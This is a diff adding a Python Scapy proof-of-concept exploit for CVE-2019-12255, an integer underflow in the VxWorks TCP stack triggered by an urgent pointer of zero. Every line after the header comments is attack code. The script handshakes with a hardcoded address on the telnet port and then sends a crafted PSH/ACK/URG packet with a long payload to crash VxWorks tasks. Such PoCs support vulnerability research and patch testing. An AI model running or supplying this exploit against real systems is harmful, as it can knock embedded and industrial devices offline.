@@ -1,0 +1,28 @@
+# Exploit Title: VxWorks TCP Urgent pointer = 0 integer underflow vulnerability
+# Discovered By: Armis Security
+# PoC Author: Zhou Yu (twitter: @504137480)
+# Vendor Homepage: https://www.windriver.com
+# Tested on: VxWorks 6.8
+# CVE: CVE-2019-12255
+# More Details: https://github.com/dazhouzhou/vxworks-poc/tree/master/CVE-2019-12255
+# The PoC can crash VxWorks tasks(set the port corresponding to the task in the PoC), such as telnet, ftp, etc.
+
+from scapy.all import *
+
+if __name__ == "__main__":
+    ip = "192.168.10.199"
+    dport = 23
+    seq_num = 1000
+    payload = "\x42"*2000
+    sport = random.randint(1024,65535)
+
+    syn = IP(dst = ip)/TCP(sport = sport , dport = dport ,flags = "S", seq=seq_num)
+    syn_ack = sr1(syn)
+
+    seq_num = seq_num + 1
+    ack_num = syn_ack.seq+1
+    ack = IP(dst = ip)/TCP(sport = sport , dport = dport ,flags = "A", seq=seq_num, ack=ack_num)
+    send(ack)
+
+    psh = IP(dst = ip)/TCP(sport = sport , dport = dport ,flags = "PAU", seq=seq_num, ack=ack_num, urgptr=0) / payload
+    send(psh)
